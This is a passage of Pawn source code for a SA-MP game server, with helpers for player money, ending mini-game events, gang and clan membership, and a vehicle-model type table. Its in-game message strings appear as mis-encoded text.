	getdate(d, d, d);
	for(new x; x < han_days; x++) if(cand[x][timeset] || cand[x][candate] <=  d) cand_create(x);
}
#endif
//=[rgba2hex]===================================================================
stock rgba2hex(r,g,b,a) return (r*16777216) + (g*65536) + (b*256) + a;
//=[IsPlayerInArea]=============================================================
stock IsPlayerInArea(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	return p[0] >= min_x && p[0] <= max_x && p[1] >= min_y && p[1] <= max_y;
}
//=[IsPlayerInCube]=============================================================
stock IsPlayerInCube(playerid,Float:min_x,Float:min_y,Float:min_z,Float:max_x,Float:max_y,Float:max_z)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	return p[0] >= min_x && p[0] <= max_x && p[1] >= min_y && p[1] <= max_y && p[2] >= min_z && p[2] <= max_z;
}
//=[CreateVStore]===============================================================
stock CreateVStore(Float:x,Float:y,Float:z,interior,world,Float:size=default_cpsize,Float:distance=default_cpdistance,vstorename[],Float:cx,Float:cy,Float:cz,Float:ca,vt)
{
	new id = CreateCheckpoint(x,y,z,interior,world,cp_vstore,size,distance,0.0,0,vstorename);
	cpinfo[id][cpstoreid] = vstores;
	vstoreinfo[vstores][vstore_active] = 1;
	vstoreinfo[vstores][vstore_count] = 0;
	vstoreinfo[vstores][vstore_center][0] = cx;
	vstoreinfo[vstores][vstore_center][1] = cy;
	vstoreinfo[vstores][vstore_center][2] = cz;
	vstoreinfo[vstores][vstore_center][3] = ca;
	vstoreinfo[vstores][vstore_type] = vt;
	/*for(new i = 6, n = numargs(); i < n; i += 2)
	{ // CreateVStore(Float:x,Float:y,Float:z,Float:size=default_cpsize,Float:distance=default_cpdistance,vstorename[],...)
		vstoreinfo[vstores][vstore_vehicles][cur] = getarg(i) - 400;
		vstoreinfo[vstores][vstore_costs][cur] = getarg(i + 1);
		cur++;
	}*/
	vstores++;
	return (vstores-1);
}
//=[AddVStoreVehicle]===========================================================
stock AddVStoreVehicle(storeid,modelid,cost)
{
	if(!vstoreinfo[storeid][vstore_active]) return 0;
	vstoreinfo[storeid][vstore_vehicles][vstoreinfo[storeid][vstore_count]] = modelid;
	vstoreinfo[storeid][vstore_costs][vstoreinfo[storeid][vstore_count]] = cost;
	vstoreinfo[storeid][vstore_count]++;
	return vstoreinfo[storeid][vstore_count] - 1;
}
//=[GiveMoney]==================================================================
stock GiveMoney(playerid, amount, brsn = -1)
{
	#if acmoney == 2
		playerinfo[playerid][money][2] = 1;
		if(amount < 0) playerinfo[playerid][money][0] -= amount;
		else playerinfo[playerid][money][0] += amount;
		GivePlayerMoney(playerid,amount);
		if(amount < 0) playerinfo[playerid][money][1] -= amount;
		else playerinfo[playerid][money][1] += amount;
	#elseif acmoney == 1
		if(!amount) return 1;
		if((playerinfo[playerid][money][0]+amount) <= 0 || (GetPlayerMoney(playerid)+amount) <= 0) ResetMoney(playerid);
		else
		{
			playerinfo[playerid][money][0] += amount;
			GivePlayerMoney(playerid,amount);
		}
	#endif
	if(playerinfo[playerid][logged])
	{
		if(amount >= 10000 && playerinfo[playerid][money][0] >= 20000 && !playerinfo[playerid][savingmoney][0])
		{
			//fsetint(fuser(playerid),"LastMoney",playerinfo[playerid][savingmoney][1] = playerinfo[playerid][money][0]);
			playerinfo[playerid][savingmoney][0] = 300;
		}
		else if(playerinfo[playerid][money][0] < playerinfo[playerid][savingmoney][1]) playerinfo[playerid][savingmoney][1] = playerinfo[playerid][money][0];
	}
	SetPlayerScore(playerid,playerinfo[playerid][money][0]);
	if(!playerinfo[playerid][modeafk]) PlaySound(playerid,1052);
	if(amount != 0) MoneyLog(playerid, amount, brsn);
	return 1;
}
//=[MoneyLog]===================================================================
stock MoneyLog(playerid, amount, brsn)
{
	if(brsn != -1 && sizeof(MoneyReasons) >= brsn)
	{
	    new logt[M_S];
		format(logt, M_S, "%s %d (%s)", (amount < 0) ? ("lost") : ("earned"), amount, MoneyReasons[brsn]);
		Log("Money", playerid, logt);
	}
}
//=[ResetMoney]=================================================================
stock ResetMoney(playerid,bool:snd=true)
{
	//playerinfo[playerid][money][2] = 1;
	//playerinfo[playerid][money][0] = 0;
	#if acmoney == 1
		playerinfo[playerid][money][0] = 0;
	#endif
	ResetPlayerMoney(playerid);
	SetPlayerScore(playerid,0);
	//playerinfo[playerid][money][1] = 0;
	if(!playerinfo[playerid][modeafk] && snd) PlaySound(playerid,1053);
	return 1;
}
//=[GetMoney]===================================================================
stock GetMoney(playerid) return playerinfo[playerid][money][0];
/*//=[CreateVehicles]===========================================================
stock CreateVehicles(amount,vehicletype,Float:x,Float:y,Float:z,Float:rotation,Float:plusx,Float:plusy,color1,color2,respawn_delay,interior,world)
{
	new Float:plusx2 = (0-plusx), Float:plusy2 = (0-plusy);
	for(new i=0;i<amount;i++)
	{
		plusx2 += plusx, plusy2 += plusy;
		CreateVehicleEx(vehicletype,x+plusx2,y+plusy2,z,rotation,color1,color2,respawn_delay,interior,world);
	}
	return 1;
}*/
//=[floatrand]==================================================================
forward Float:floatrand(Float:min, Float:max);
public Float:floatrand(Float:min, Float:max)
{
	new imin = floatround(min);
	return float(random((floatround(max) - imin) * 100) + (imin * 100)) / 100.0;
}
//=[EndRace]====================================================================
stock EndRace(reason[],adminid)
{
	new string[M_S];
	assert raceinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .фющ°хї схшь");
	else format(string,sizeof(string)," .%s фющ°хї схшь Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inrace] || playerinfo[i][waitrace]))
		{
			if(playerinfo[i][inrace])
			{
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
				DisablePlayerRaceCheckpoint(i);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙фющ°хї схшь");
				GiveMoney(i,join_act);
				RaceTextDraw(i,"delete");
				PlaySound(i,1098);
				CallRemoteFunction("AllowPrizeUsing","ii",i,1);
			}
			playerinfo[i][inrace] = 0, playerinfo[i][waitrace] = 0, playerinfo[i][racecp] = 0, playerinfo[i][raceid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	raceinfo[0] = 0, raceinfo[1] = 0, raceinfo[2] = 0, raceinfo[4] = 99, raceinfo[6] = 0;
	KillTimer(raceinfo[3]);
	KillTimer(raceinfo[7]);
	thereIsAct = false;
	return 1;
}
//=[EndWar]=====================================================================
stock EndWar(reason[],adminid)
{
	new string[M_S];
	assert warinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .фюьчюф схшьф");
	else format(string,sizeof(string)," .%s фюьчюф схшьф Єь щущ фрующя",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inwar] || playerinfo[i][waitwar]))
		{
			if(playerinfo[i][inwar])
			{
				SpawnPlayer(i);
				SetPlayerInterior(i,0);
				SetFreeze(i,0);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙юьчю· ф∙°· схшьф");
				GiveMoney(i,join_act);
			}
			playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0;
	KillTimer(warinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[EndWWE]=====================================================================
stock EndWWE(reason[],adminid)
{
	new string[M_S];
	assert wweinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф WWE ·ч°х· ф");
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя WWE ·ч°х· ф",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(playerinfo[i][inwwe] || playerinfo[i][waitwwe])
			{
				if(playerinfo[i][inwwe])
				{
					SpawnPlayer(i);
					SetPlayerInterior(i,0);
					SetFreeze(i,0);
					SetPlayerVirtualWorld(i,world_normal);
					SendClientMessage(i,orange," .схшьф WWE ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· ф");
                    GiveMoney(i, join_act);
				}
				playerinfo[i][inwwe] = 0, playerinfo[i][waitwwe] = 0, playerinfo[i][wweid] = 0;
				playerinfo[i][inact] = 0;
			}
			else if(playerinfo[i][viewerwwe])
			{
				TogglePlayerSpectating(i,0);
				playerinfo[i][viewerwwe] = 0;
				playerinfo[i][inact] = 0;
				SendClientMessage(i,orange," .схшьф WWE ·ч°х· ф");
			}
		}
	}
	wweinfo[0] = 0, wweinfo[1] = 0, wweinfo[2] = 0, wweinfo[4] = -1, wweinfo[5] = 0, wweinfo[6] = 0;
	KillTimer(wweinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[EndKart]====================================================================
stock EndKart(reason[],adminid)
{
	new string[M_S];
	assert kartinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф Kart ·ч°х· ф");
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя Kart ·ч°х· ф",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inkart] || playerinfo[i][waitkart]))
		{
			if(playerinfo[i][inkart])
			{
				SetFreeze(i,0);
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .схшьф Kart ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· ф");
				GiveMoney(i,join_act);
			}
			DestroyVehicleEx(playerinfo[i][kartv]);
			playerinfo[i][inkart] = 0, playerinfo[i][waitkart] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	if(kartinfo[4] > 0) DestroyPickupEx(kartinfo[4]);
	kartinfo[0] = 0, kartinfo[1] = 0, kartinfo[2] = 0, kartinfo[4] = 0, kartinfo[5] = 0;
	KillTimer(kartinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[EndMonster]=================================================================
stock EndMonster(reason[],adminid)
{
	new string[M_S];
	assert monsterinfo[0];
	if(adminid == -1) format(string,sizeof(string)," .схшьф Monster ·ч°х· ф");
	else format(string,sizeof(string)," .%s схшьф Єь щущ фрующя Monster ·ч°х· ф",GetName(adminid));
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," ёщсф: %s",reason);
	SendClientMessageToAll(red,string);
	for(new i=0;i<MAX_PLAYERS_;i++)
	{
		if(IsPlayerConnected(i) && (playerinfo[i][inmonster] || playerinfo[i][waitmonster]))
		{
			if(playerinfo[i][inmonster])
			{
				SetFreeze(i,0);
				SpawnPlayer(i);
				SetPlayerVirtualWorld(i,world_normal);
				SendClientMessage(i,orange," .схшьф Monster ўщсь· ЇщЎхщ ыёЇщ [" #join_act "$] Єь ыъ ∙·ч°х· ф");
				GiveMoney(i,join_act);
			}
			DestroyVehicleEx(playerinfo[i][monsterv]);
			playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
			playerinfo[i][inact] = 0;
		}
	}
	if(monsterinfo[4] > 0) DestroyPickupEx(monsterinfo[4]);
	monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0, monsterinfo[4] = 0, monsterinfo[5] = 0;
	KillTimer(monsterinfo[3]);
	thereIsAct = false;
	return 1;
}
//=[ExitWork]===================================================================
stock ExitWork(playerid,reason[])
{
	new string[M_S];
	playerinfo[playerid][work] = work_none;
	playerinfo[playerid][coplevel] = 0;
	playerinfo[playerid][doctorlevel] = 0;
	SendClientMessage(playerid,red," :щЎр· \\ фхЎр· юЄсху·ъ. ёщсф");
	format(string,sizeof(string)," %s",reason);
	SendClientMessage(playerid,red,string);
	return 1;
}
//=[IsPlayerMAdmin]=============================================================
stock IsPlayerMAdmin(playerid) return playerid == ConsoleID || (playerinfo[playerid][admin] > 0 && PlayerHasRank(playerid,RankID("рующЁщэ")));
//=[randomEx]===================================================================
stock randomEx(min,max) return random(max-min)+min;
//=[GetXYInFrontOfPlayer]=======================================================
stock GetXYInFrontOfPlayer(playerid,&Float:x,&Float:y,Float:distance)
{   // by Y_Less, improved by me
	new Float:a;
	GetPlayerPos(playerid,x,y,a);
	GetPlayerFacingAngle(playerid,a);
	if(GetPlayerVehicleID(playerid)) GetVehicleZAngle(GetPlayerVehicleID(playerid),a);
	x += (distance * floatsin(-a,degrees)), y += (distance * floatcos(-a,degrees));
	return 1;
}
//=[GetXYInFrontOfVehicle]======================================================
stock GetXYInFrontOfVehicle(vehicleid,&Float:x,&Float:y,Float:distance)
{
	new Float:a;
	GetVehiclePos(vehicleid,x,y,a);
	GetVehicleZAngle(vehicleid,a);
	x += (distance * floatsin(-a,degrees)), y += (distance * floatcos(-a,degrees));
	return 1;
}
//=[WeaponName]=================================================================
stock WeaponName(weaponid) return WeaponNames[weaponid];
//=[SetFreeze]==================================================================
stock SetFreeze(playerid,freeze,bool:adminfreeze=false)
{
	if(!freeze)
	{
		if(playerinfo[playerid][frozen][1] && !adminfreeze) return 1;
		if(!playerinfo[playerid][frozen][0]) TogglePlayerControllable(playerid,0);
	}
	if(adminfreeze) playerinfo[playerid][frozen][1] = freeze;
	TogglePlayerControllable(playerid,!freeze);
	playerinfo[playerid][frozen][0] = freeze;
	if(playerinfo[playerid][powerparam] > powerparam_none) StopUsingPower(playerid);
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	for(new i = 0; i < 3; i++) playerinfo[playerid][freezepos][i] = freeze ? p[i] : 0.0;
	return 1;
}
//=[PlayerLeaveGang]============================================================
stock PlayerLeaveGang(playerid,mtype)
{
	new string[M_S];
	if(playerinfo[playerid][gang] > 0)
	{
		for(new i=0;i<ganginfo[playerinfo[playerid][gang]][gmembers];i++)
		{
			if(ganginfo[playerinfo[playerid][gang]][gplayers][i] == playerid)
			{
				ganginfo[playerinfo[playerid][gang]][gmembers]--;
	  			for(new j=i;j<ganginfo[playerinfo[playerid][gang]][gmembers];j++) ganginfo[playerinfo[playerid][gang]][gplayers][j] = ganginfo[playerinfo[playerid][gang]][gplayers][j+1];
	  			if(ganginfo[playerinfo[playerid][gang]][gleader] == playerid) ganginfo[playerinfo[playerid][gang]][gleader] = INVALID_PLAYER_ID;
				if(ganginfo[playerinfo[playerid][gang]][gmembers] <= 0)
				{
					ganginfo[playerinfo[playerid][gang]][gexist] = 0;
					ganginfo[playerinfo[playerid][gang]][gmembers] = 0;
					ganginfo[playerinfo[playerid][gang]][gbank] = 0;
					ganginfo[playerinfo[playerid][gang]][gleader] = INVALID_PLAYER_ID;
					for(new j=0;j<3;j++) ganginfo[playerinfo[playerid][gang]][gcolor][j] = 0;
	   			}
	   			if(mtype != 0)
	   			{
					for(new j=0;j<ganginfo[playerinfo[playerid][gang]][gmembers];j++)
					{
						if(mtype == 1) format(string,sizeof(string)," .Ї°∙ юфыЁхЇщщф %s",GetName(playerid));
						else if(mtype == 2) format(string,sizeof(string)," .фхЎр юфыЁхЇщщф %s",GetName(playerid));
						SendClientMessage(ganginfo[playerinfo[playerid][gang]][gplayers][j],red,string);
					}
				}
				format(string,sizeof(string)," .\"%s\" щЎр· юыЁхЇщщ·",ganginfo[playerinfo[playerid][gang]][gname]);
				SendClientMessage(playerid,orange,string);
				playerinfo[playerid][gang] = 0, playerinfo[playerid][igang] = 0;
				SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
			}
		}
	}
	return 1;
}
//=[PlayerLeaveClan]============================================================
stock PlayerLeaveClan(playerid,bool,dontclose=0, reason = -1)
{
	if(playerinfo[playerid][clan] != 0)
	{
	    new string[M_S];
	   	switch(reason)
	   	{
 			case 0:
			{
			 	format(string,sizeof(string)," .\"%s\" щЎр· юфўьря",claninfo[playerinfo[playerid][clan]][cname]);
				SendClientMessage(playerid, orange, string);
				format(string,sizeof(string)," .Ї°∙ юфўьря %s",GetName(playerid));
			}
			case 1: format(string,sizeof(string)," .фхЎр юфўьря %s",GetName(playerid));
			case 2: format(string,sizeof(string)," .фхЎр юфўьря Єь щущ фрующя %s",GetName(playerid));
		}
		if(reason != -1) for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][clan] == playerinfo[playerid][clan]) SendClientMessage(x, red, string);
		for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) if(claninfo[playerinfo[playerid][clan]][cplayers][i] == playerid)
		{
			claninfo[playerinfo[playerid][clan]][cmembers]--;
  			for(new j = i; j < claninfo[playerinfo[playerid][clan]][cmembers]; j++) claninfo[playerinfo[playerid][clan]][cplayers][j] = claninfo[playerinfo[playerid][clan]][cplayers][j+1];
	  	}
		if(claninfo[playerinfo[playerid][clan]][cruling][0] > 0) TextDrawHideForPlayer(playerid,claninfo[playerinfo[playerid][clan]][crulingtext]);
		if(!dontclose) CloseClanMenu(playerinfo[playerid][clan],bool ? ("рчу юф∙чўЁщэ ыс° ьр сўьря") : ("рчу юф∙чўЁщэ ф·Ё·ў юф∙°·"),true);
		if(playerinfo[playerid][clancam] != -1) ClanCameraOff(playerid);
		if(playerinfo[playerid][logged] && bool)
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
			ClanPList_Del(playerinfo[playerid][clan],GetName(playerid));
			fsetint(fuser(playerid),"ClanCode",0);
			fsetint(fuser(playerid),"ClanLevel",1);
			fsetstring(fuser(playerid),"ClanTag","x");
		}
		playerinfo[playerid][clan] = 0, playerinfo[playerid][iclan] = 0, playerinfo[playerid][lclan] = 1, playerinfo[playerid][clantag][0] = 0;
		SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
	}
	return 1;
}
//=[PlayerLeaveOrg]=============================================================
stock PlayerLeaveOrg(playerid)
{
	playerinfo[playerid][org] = 0;
	playerinfo[playerid][lorg] = 0;
	playerinfo[playerid][orgtag][0] = 0;
	if(playerinfo[playerid][logged])
	{
		fsetint(fuser(playerid),"Org",0);
		fsetint(fuser(playerid),"OrgLevel",1);
		fsetstring(fuser(playerid),"OrgTag","x");
	}
	return 1;
}
//=[strhex]=====================================================================
stock strhex(string[])
{   // by Y_Less, improved by me
	new ret, val, i;
	if(string[0] == '0' && (string[1] == 'x' || string[1] == 'X')) i = 2;
	while(string[i])
	{
		ret <<= 4, val = (string[i++] - '0');
		if(val > 0x09) val -= 0x07;
		if(val > 0x0F) val -= 0x20;
		if(val < 0x01) continue;
		if(val < 0x10) ret += val;
	}
	return ret;
}
//=[IsHex]======================================================================
stock IsHex(string[])
{   // by Y_Less, improved by me
	new i, cur;
	if(string[0] == '0' && (string[1] == 'x' || string[1] == 'X')) i = 2;
	while(string[i])
	{
		cur = string[i++];
		if((cur < '0') || (cur > '9' && cur < 'A') || (cur > 'F' && cur < 'a') || (cur > 'f')) return false;
	}
	return 1;
}
//=[IsRaceVehicle]==============================================================
stock IsRaceVehicle(racetype,vehicleid)
{
	if(((racetype == race1_cars || racetype == race6_tires || racetype == race7_invcars || racetype == race8_waterdrive) && GetVehicleType(vehicleid) != 0) ||
	(racetype == race2_bikes && GetVehicleType(vehicleid) != 1) ||
	(racetype == race3_planes && GetVehicleType(vehicleid) != 4 && GetVehicleModel(vehicleid) != 592 && GetVehicleModel(vehicleid) != 577) ||
	(racetype == race4_boats && GetVehicleType(vehicleid) != 2)) return 0;
	return 1;
}
//=[GetVehicleType]=============================================================
stock GetVehicleType(vid,mod=0)
{   // by yellowblood, improved by me
	switch(mod ? vid : GetVehicleModel(vid))
	{
		case
		596,   //copcarla,   //car
		599,   //copcarru,   //car
		597,   //copcarsf,   //car
		416,   //ambulan  -  car
		445,   //admiral  -  car
		602,   //alpha  -  car
		485,   //baggage  -  car
		568,   //bandito  -  car
		429,   //banshee  -  car
		499,   //benson  -  car
		424,   //bfinject,   //car
		536,   //blade  -  car
		496,   //blistac  -  car
		504,   //bloodra  -  car
		422,   //bobcat  -  car
		609,   //boxburg  -  car
		498,   //boxville,   //car
		401,   //bravura  -  car
		575,   //broadway,   //car
		518,   //buccanee,   //car
		402,   //buffalo  -  car
		541,   //bullet  -  car
		482,   //burrito  -  car
		431,   //bus  -  car
		438,   //cabbie  -  car
		457,   //caddy  -  car
		527,   //cadrona  -  car
		483,   //camper  -  car
		524,   //cement  -  car
		415,   //cheetah  -  car
		542,   //clover  -  car
		589,   //club  -  car
		480,   //comet  -  car
		578,   //dft30  -  car
		486,   //dozer  -  car
		507,   //elegant  -  car
		562,   //elegy  -  car
		585,   //emperor  -  car
		427,   //enforcer,   //car
		419,   //esperant,   //car
		587,   //euros  -  car
		490,   //fbiranch,   //car
		528,   //fbitruck,   //car
		533,   //feltzer  -  car
		544,   //firela  -  car
		407,   //firetruk,   //car
		565,   //flash  -  car
		455,   //flatbed  -  car
		530,   //forklift,   //car
		526,   //fortune  -  car
		466,   //glendale,   //car
		604,   //glenshit,   //car
		492,   //greenwoo,   //car
		474,   //hermes  -  car
		434,   //hotknife,   //car
		502,   //hotrina  -  car
		503,   //hotrinb  -  car
		494,   //hotring  -  car
		579,   //huntley  -  car
		545,   //hustler  -  car
		411,   //infernus,   //car
		546,   //intruder,   //car
		559,   //jester  -  car
		508,   //journey  -  car
		571,   //kart  -  car
		400,   //landstal,   //car
		403,   //linerun  -  car
		517,   //majestic,   //car
		410,   //manana  -  car
		551,   //merit  -  car
		500,   //mesa  -  car
		418,   //moonbeam,   //car
		572,   //mower  -  car
		423,   //mrwhoop  -  car
		516,   //nebula  -  car
		582,   //newsvan  -  car
		467,   //oceanic  -  car
		404,   //peren  -  car
		514,   //petro  -  car
		603,   //phoenix  -  car
		600,   //picador  -  car
		413,   //pony  -  car
		426,   //premier  -  car
		436,   //previon  -  car
		547,   //primo  -  car
		489,   //rancher  -  car
		441,   //rcbandit,   //car
		594,   //rccam  -  car
		564,   //rctiger  -  car
		515,   //rdtrain  -  car
		479,   //regina  -  car
		534,   //remingtn,   //car
		505,   //rnchlure,   //car
		442,   //romero  -  car
		440,   //rumpo  -  car
		475,   //sabre  -  car
		543,   //sadler  -  car
		605,   //sadlshit,   //car
		495,   //sandking,   //car
		567,   //savanna  -  car
		428,   //securica,   //car
		405,   //sentinel,   //car
		535,   //slamvan  -  car
		458,   //solair  -  car
		580,   //stafford,   //car
		439,   //stallion,   //car
		561,   //stratum  -  car
		409,   //stretch  -  car
		560,   //sultan  -  car
		550,   //sunrise  -  car
		506,   //supergt  -  car
		574,   //sweeper  -  car
		566,   //tahoma  -  car
		549,   //tampa  -  car
		420,   //taxi  -  car
		459,   //topfun  -  car
		576,   //tornado  -  car
		583,   //tug  -  car
		451,   //turismo  -  car
		558,   //uranus  -  car
		552,   //utility  -  car
		540,   //vincent  -  car
		491,   //virgo  -  car
		412,   //voodoo  -  car
		478,   //walton  -  car
		421,   //washing  -  car
		529,   //willard  -  car
		555,   //windsor  -  car
		456,   //yankee  -  car
		554,   //yosemite,   //car
		477,   //zr3	50  -  car
		588,   //hotdog  -  car
		437,   //coach  -  car
		532,   //combine  -  car
		433,   //barracks,   //car
		414,   //mule  -  car
		443,   //packer  -  car
		470,   //patriot  -  car
		432,   //rhino  -  car
		525,   //towtruck,   //car
		531,   //tractor  -  car
		408,   //trash  -  car
		406,   //dumper  -  mtruck
		573,   //duneride,   //mtruck
		444,   //monster  -  mtruck
		556,   //monstera,   //mtruck
		557	//monsterb,   //mtruck
		: return 0;
		case
		581,   //bf400  -  bike
		523,   //copbike  -  bike
		462,   //faggio  -  bike
		521,   //fcr900  -  bike
		463,   //freeway  -  bike
		522,   //nrg500  -  bike
		461,   //pcj600  -  bike
		448,   //pizzaboy,   //bike
		468,   //sanchez  -  bike
		586,   //wayfarer,   //bike
		509,   //bike  -  bmx
		481,   //bmx  -  bmx
		510,   //mtbike  -  bmx
		471   //quad  -  quad
		: return 1;
		case
		472,   //coastg  -  boat
		473,   //dinghy  -  boat
		493,   //jetmax  -  boat
		595,   //launch  -  boat
		484,   //marquis  -  boat
		430,   //predator,   //boat
		453,   //reefer  -  boat
		452,   //speeder  -  boat
		446,   //squalo  -  boat
		454   //tropic  -  boat
		: return 2;
		case
		548,   //cargobob,   //heli
		425,   //hunter  -  heli
		417,   //leviathn,   //heli
		487,   //maverick,   //heli
		497,   //polmav  -  heli
		563,   //raindanc,   //heli
		501,   //rcgoblin,   //heli
		465,   //rcraider,   //heli
		447,   //seaspar  -  heli
		469,   //sparrow  -  heli
		488	   //vcnmav  -  heli
		: return 3;
		case
		592,   //androm  -  plane
		577,   //at	400  -  plane
		511,   //beagle  -  plane
		512,   //cropdust,   //plane
		593,   //dodo  -  plane
		520,   //hydra  -  plane
		553,   //nevada  -  plane
		464,   //rcbaron  -  plane
		476,   //rustler  -  plane
		519,   //shamal  -  plane
		460,   //skimmer  -  plane
		513,   //stunt  -  plane
		539   //vortex  -  plane
		: return 4;
		case
		435,   //artict1  -  trailer
		450,   //artict2  -  trailer
		591,   //artict3  -  trailer
		606,   //bagboxa  -  trailer
		607,   //bagboxb  -  trailer
		610,   //farmtr1  -  trailer
		584,   //petrotr  -  trailer
		608,   //tugstair,   //trailer
		611,   //utiltr1  -  trailer
		590,   //freibox  -  train
		569,   //freiflat,   //train
		537,   //freight  -  train
		538,   //streak  -  train
		570,   //streakc  -  train
		449   //tram  -  train
		: return 5;
	}
	return -1;
}
//=[IsValidWeather]=============================================================
stock IsValidWeather(weatherid) return weatherid < 0 || weatherid > 50? 0:1;
//=[IsValidObjectModel]=========================================================
stock IsValidObjectModel(omodelid)
{   // by opium, improved by me
	switch(omodelid)
	{
		case 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232,
		1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242,
		1243, 1445, 1487, 1299, 4022, 620, 4550, 15030, 15029, 15031,
		15042, 1768, 1818, 1717, 2100, 2023, 2297, 2126, 2249, 2138,
		2139, 2136, 2135, 2121, 2109, 13592, 13666, 13641, 13639,
		13634, 8493, 3374, 1305, 2918, 1472, 9766, 5130, 4563, 1468, 1583,
		1584, 1574, 1248, 1512, 1598, 1608, 1594, 1607, 1813, 3642, 3616,
		9322, 2780, 3425, 3461, 3515, 3524, 3528, 3586, 6865,
		7916, 8484, 8979, 14608, 16776, 3397, 10009, 13831, 14467, //jacob objects
		902, 903, 953, 1461, 1599, 1600, 1601, 1602, 1603, 1604, 1605,
		1606, 1609, 1610, 1611, 1637, 1640, 1641, 1642,
		1643, 2404, 2405, 2406, 2410, 2782, //beach and sea
		1612, 3406, 3578, 3620, 3753, 3879, 3886, 5108, 5109, 5115, 5143, 5145,
		5146, 5154, 5155, 5156, 5157, 5158, 5160, 5166, 5167, 5176, 5184, 6188,
		6189, 6230, 6300, 8373, 9090, 9229, 9230, 9253, 9257, 9329, 9584, 9585,
		9586, 9590, 9612, 9613, 9818, 9819, 9820, 9821, 9822, 9829, 9858, 9902,
		9954, 9955, 9956, 9958, 10140, 10226, 10227, 10229, 10230, 10300, 10301,
		10305, 10771, 10793, 10794, 10795, 10824, 10826, 10827, 10828, 10830, 10831,
		10833, 10834, 10841, 11009, 11145, 11146, 11237, 11495, 12990, 16502, 17068,
		18024, //ships docks etc
		3249, 6869, 6985, 6987, 6988, 6989, 7071, 7263, 7265, 7289, 7521, 8395, 8399,
		8400, 8501, 8663, 9070, 9071, 9072, 9076, 9104, 9582, 10398, 10713, 13132, 14399,
		14463, 14533, 14536, 14537, 14546, 14560, 14563, 14581, 14590, 14606, 14607, 14614,
		14623, 14624, 14625, 14738, 14777, 14785, 14808, 14809, 14815, 14821, 14831, 14832,
		14835, 14836, 14838, 16021, 16051, 16146, 16150, 16690, 17523, 17700, 18018, 18028,
		18090, //bar & casino
		3689, 3707, 3755, 3776, 4860, 5129, 5131, 5135, 5137, 5138, 5139, 5174, 5175, 5177,
		5180, 5183, 5192, 5278, 5309, 5310, 5313, 5397, 5728, 6340, 6404, 6490, 6925, 7019,
		7020, 7021, 7035, 7269, 7490, 7492, 7494, 7495, 7496, 7497, 7513, 7627, 7832, 7861,
		8057, 8058, 8059, 8060, 8061, 8062, 8063, 8064, 8065, 8066, 8067, 8069, 8254, 8255,
		8260, 8300, 8544, 8545, 8546, 9243, 9244, 9247, 9260, 9680, 10775, 10776, 10840, 10843,
		10844, 10845, 10846, 10847, 10856, 10965, 10966, 11010, 11011, 11012, 11081, 11085, 11086,
		11087, 11089, 11090, 11093, 11233, 11234, 11235, 11236, 11244, 11290, 11293, 11295, 11461,
		11543, 12847, 12931, 12941, 12981, 12988, 13059, 13060, 13061, 13065, 13066, 13077, 13078,
		13198, 14572, 14577, 14588, 14784, 14795, 16271, 16272, 16385, 16398, 16399, 16400, 17012,
		17013, 17014, 17015, 17016, 17017, 17021, 17022, 17023, 17024, 17038, 17040, 17049, 17050,
		17051, 17072, 17073, 17538, 17546, 17636, 18200, 18365, 18496, //factories and warehouses
